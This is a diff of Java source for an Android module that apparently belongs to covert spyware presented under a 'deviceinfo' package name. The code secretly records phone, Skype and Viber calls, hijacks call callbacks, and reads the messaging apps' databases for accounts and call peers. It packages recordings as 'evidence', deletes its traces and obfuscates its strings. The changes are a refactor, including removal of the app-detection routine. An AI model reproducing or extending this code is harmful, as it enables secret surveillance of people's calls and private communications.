@@ -36,7 +36,7 @@ import com.android.deviceinfo.conf.ConfModule;
 import com.android.deviceinfo.conf.Configuration;
 import com.android.deviceinfo.conf.ConfigurationException;
 import com.android.deviceinfo.db.GenericSqliteHelper;
-import com.android.deviceinfo.evidence.EvidenceReference;
+import com.android.deviceinfo.evidence.EvidenceBuilder;
 import com.android.deviceinfo.evidence.EvidenceType;
 import com.android.deviceinfo.evidence.Markup;
 import com.android.deviceinfo.file.AutoFile;
@@ -271,7 +271,7 @@ public class ModuleCall extends BaseModule implements Observer<Call> {
 			// Stored filetime (unix epoch() is in seconds not ms)
 			String split[] = fullName.split("-");
 			long epoch = Long.parseLong(split[1]);
-			//long id = Long.parseLong(split[2]);
+			// long id = Long.parseLong(split[2]);
 
 			// Files older than 24 hours are removed
 			if (now - epoch > 60 * 60 * 24) {
@@ -470,8 +470,9 @@ public class ModuleCall extends BaseModule implements Observer<Call> {
 	private boolean saveCallEvidence(String peer, String myNumber, boolean incoming, Date dateBegin, Date dateEnd,
 			String currentRecordFile, boolean autoClose, int channel, int programId) {
 		if (Cfg.DEBUG) {
-			//Check.log(TAG + " (saveCallEvidence): " + currentRecordFile + " peer: " + peer + " from: " + dateBegin
-			//		+ " to: " + dateEnd + " incoming: " + incoming);
+			// Check.log(TAG + " (saveCallEvidence): " + currentRecordFile +
+			// " peer: " + peer + " from: " + dateBegin
+			// + " to: " + dateEnd + " incoming: " + incoming);
 		}
 
 		final byte[] additionaldata = getCallAdditionalData(peer, myNumber, incoming, new DateTime(dateBegin),
@@ -480,7 +481,8 @@ public class ModuleCall extends BaseModule implements Observer<Call> {
 		AutoFile file = new AutoFile(currentRecordFile);
 		if (file.exists() && file.getSize() > HEADER_SIZE && file.canRead()) {
 			if (Cfg.DEBUG) {
-				//Check.log(TAG + " (saveCallEvidence): file size = " + file.getSize());
+				// Check.log(TAG + " (saveCallEvidence): file size = " +
+				// file.getSize());
 			}
 
 			int offset = 0;
@@ -488,7 +490,7 @@ public class ModuleCall extends BaseModule implements Observer<Call> {
 
 			if (ByteArray.equals(header, 0, AMR_HEADER, 0, AMR_HEADER.length)) {
 				if (Cfg.DEBUG) {
-					//Check.log(TAG + " (saveCallEvidence): AMR header");
+					// Check.log(TAG + " (saveCallEvidence): AMR header");
 				}
 				offset = AMR_HEADER.length;
 			}
@@ -501,18 +503,21 @@ public class ModuleCall extends BaseModule implements Observer<Call> {
 			}
 
 			if (Cfg.DEBUG) {
-				//Check.log(TAG + " (saveCallEvidence), data len: " + data.length + " pos: " + pos);
-				//Check.log(TAG + " (saveCallEvidence), data[0:6]: " + ByteArray.byteArrayToHex(data).substring(0, 20));
+				// Check.log(TAG + " (saveCallEvidence), data len: " +
+				// data.length + " pos: " + pos);
+				// Check.log(TAG + " (saveCallEvidence), data[0:6]: " +
+				// ByteArray.byteArrayToHex(data).substring(0, 20));
 			}
 
-			EvidenceReference.atomic(EvidenceType.CALL, additionaldata, data);
+			EvidenceBuilder.atomic(EvidenceType.CALL, additionaldata, data);
 
 			if (autoClose) {
-				EvidenceReference.atomic(EvidenceType.CALL, additionaldata, ByteArray.intToByteArray(0xffffffff));
+				EvidenceBuilder.atomic(EvidenceType.CALL, additionaldata, ByteArray.intToByteArray(0xffffffff));
 			}
 
 			if (Cfg.DEBUG) {
-				//Check.log(TAG + " (saveCallEvidence): deleting file: " + file);
+				// Check.log(TAG + " (saveCallEvidence): deleting file: " +
+				// file);
 			}
 
 			file.delete();
@@ -532,7 +537,7 @@ public class ModuleCall extends BaseModule implements Observer<Call> {
 			Check.log(TAG + "(closeCallEvidence): closing call for " + peer);
 		}
 
-		EvidenceReference.atomic(EvidenceType.CALL, additionaldata, ByteArray.intToByteArray(0xffffffff));
+		EvidenceBuilder.atomic(EvidenceType.CALL, additionaldata, ByteArray.intToByteArray(0xffffffff));
 	}
 
 	private int checkIntegrity(byte[] data) {
@@ -557,7 +562,7 @@ public class ModuleCall extends BaseModule implements Observer<Call> {
 	private byte[] getCallAdditionalData(String peer, String myNumber, boolean incoming, DateTime dateBegin,
 			DateTime dateEnd, int channels, int programId) {
 		if (Cfg.DEBUG) {
-			Check.log(TAG + " (getCallAdditionalData): caller: " + peer+ " callee: " + myNumber);
+			Check.log(TAG + " (getCallAdditionalData): caller: " + peer + " callee: " + myNumber);
 		}
 
 		if (Cfg.DEBUG) {
@@ -595,8 +600,10 @@ public class ModuleCall extends BaseModule implements Observer<Call> {
 		additionalData.write(callee);
 
 		if (Cfg.DEBUG) {
-			//Check.log(TAG + " (getCallAdditionalData) caller: %s callee: %s", caller.length, callee.length);
-			//Check.log(TAG + " getPosition: %s, len: %s ", additionalData.getPosition(), len);
+			// Check.log(TAG + " (getCallAdditionalData) caller: %s callee: %s",
+			// caller.length, callee.length);
+			// Check.log(TAG + " getPosition: %s, len: %s ",
+			// additionalData.getPosition(), len);
 		}
 
 		if (Cfg.DEBUG) {
@@ -631,7 +638,7 @@ public class ModuleCall extends BaseModule implements Observer<Call> {
 			outputStream.write(WChar.getBytes(to, true));
 			outputStream.write(WChar.getBytes(to, true));
 			outputStream.write(ByteArray.intToByteArray(duration));
-			outputStream.write(ByteArray.intToByteArray(EvidenceReference.E_DELIMITER));
+			outputStream.write(ByteArray.intToByteArray(EvidenceBuilder.E_DELIMITER));
 
 		} catch (IOException ex) {
 			if (Cfg.EXCEPTION) {
@@ -645,7 +652,7 @@ public class ModuleCall extends BaseModule implements Observer<Call> {
 		}
 
 		byte[] data = outputStream.toByteArray();
-		EvidenceReference.atomic(EvidenceType.CALLLISTNEW, null, data);
+		EvidenceBuilder.atomic(EvidenceType.CALLLISTNEW, null, data);
 	}
 
 	private boolean isSupported() {
@@ -927,26 +934,27 @@ public class ModuleCall extends BaseModule implements Observer<Call> {
 		String encodedFileName = file.getName();
 
 		boolean remote = encodedFile.endsWith(M.e("-r.tmp.err"));
-		
+
 		long streamId = getStreamId(encodedFile);
 		boolean ret = callInfo.setStreamId(remote, streamId);
 
-		if (!updateCallInfo(callInfo, false)) {
+		if (!callInfo.update(false)) {
 			if (Cfg.DEBUG) {
 				Check.log(TAG + " (encodeChunks): unknown call program");
 			}
-			
+
 			return;
 		}
-		
+
 		// Decide heuristics logic
 		boolean heuristic = true;
-		
+
 		if (!callInfo.heuristic && remote) { // Skype
 			if (Cfg.DEBUG) {
-				Check.log(TAG + "(encodeChunks): Skype call in progress, applying bitrate heuristics on remote channel only");
+				Check.log(TAG
+						+ "(encodeChunks): Skype call in progress, applying bitrate heuristics on remote channel only");
 			}
-			
+
 			heuristic = false;
 		}
 
@@ -1007,10 +1015,10 @@ public class ModuleCall extends BaseModule implements Observer<Call> {
 
 				finished[remote ? 1 : 0] = true;
 				if (Cfg.DEBUG) {
-					Check.log(TAG + " (encodeChunks) finished: [" + finished[0] + "," + finished[1] + "]" );
+					Check.log(TAG + " (encodeChunks) finished: [" + finished[0] + "," + finished[1] + "]");
 				}
-				// || callInfo.programId == 0x0148  
-				if ( (finished[0] && finished[1]) ) {
+				// || callInfo.programId == 0x0148
+				if ((finished[0] && finished[1])) {
 					// After encoding create the end of call marker
 					if (callInfo.delay) {
 						saveAllEvidences(chunks, begin, end);
@@ -1032,7 +1040,7 @@ public class ModuleCall extends BaseModule implements Observer<Call> {
 
 		// Remove file
 		if (Cfg.DEBUG) {
-			//Check.log(TAG + "(encodeChunks): deleting " + file.getName());
+			// Check.log(TAG + "(encodeChunks): deleting " + file.getName());
 		}
 
 		audioEncoder.removeRawFile();
@@ -1070,7 +1078,7 @@ public class ModuleCall extends BaseModule implements Observer<Call> {
 			Check.log(TAG + " (saveAllEvidences) chunks: " + chunks.size());
 		}
 		CallInfo callInfo = new CallInfo();
-		updateCallInfo(callInfo, true);
+		callInfo.update(true);
 
 		String caller = callInfo.getCaller();
 		String callee = callInfo.getCallee();
@@ -1090,69 +1098,7 @@ public class ModuleCall extends BaseModule implements Observer<Call> {
 		closeCallEvidence(caller, callee, true, begin, end, callInfo.programId);
 	}
 
-	private boolean updateCallInfo(CallInfo callInfo,  boolean end) {
-
-		// RunningAppProcessInfo fore = runningProcesses.getForeground();
-		if (callInfo.valid) {
-			return true;
-		}
-
-		ListenerProcess lp = ListenerProcess.self();
-
-		if (lp.isRunning(M.e("com.skype.raider"))) {
-			if (end) {
-				return true;
-			}
-			callInfo.processName = M.e("com.skype.raider");
-			// open DB
-			String account = ChatSkype.readAccount();
-			callInfo.account = account;
-			callInfo.programId = 0x0146;
-			callInfo.delay = false;
-			callInfo.heuristic = false;
-
-			GenericSqliteHelper helper = ChatSkype.openSkypeDBHelper(account);
-
-			boolean ret = false;
-			if (helper != null) {
-				ret = ChatSkype.getCurrentCall(helper, callInfo);
-				if (Cfg.DEBUG) {
-					Check.log(TAG + " (updateCallInfo): id: " + callInfo.id + " peer: " + callInfo.peer);
-				}
-			}
-
-			return ret;
-		} else if (lp.isRunning(M.e("com.viber.voip"))) {
-			boolean ret = false;
-			callInfo.processName = M.e("com.viber.voip");
-			callInfo.delay = true;
-			callInfo.heuristic = true;
-			
-			// open DB
-			callInfo.programId = 0x0148;
-			if (end) {
-				String account = ChatViber.readAccount();
-				callInfo.account = account;
-				GenericSqliteHelper helper = ChatViber.openViberDBHelperCall();
-
-				if (helper != null) {
-					ret = ChatViber.getCurrentCall(helper, callInfo);
-				}
-
-				if (Cfg.DEBUG) {
-					Check.log(TAG + " (updateCallInfo) id: " + callInfo.id);
-				}
-			} else {
-				callInfo.account = M.e("delay");
-				callInfo.peer = M.e("delay");
-				ret = true;
-			}
-
-			return ret;
-
-		}
-		return false;
-	}
+	
 
 	public class HijackCallBack implements ICallBack {
 		private static final String TAG = "InternalCallBack";
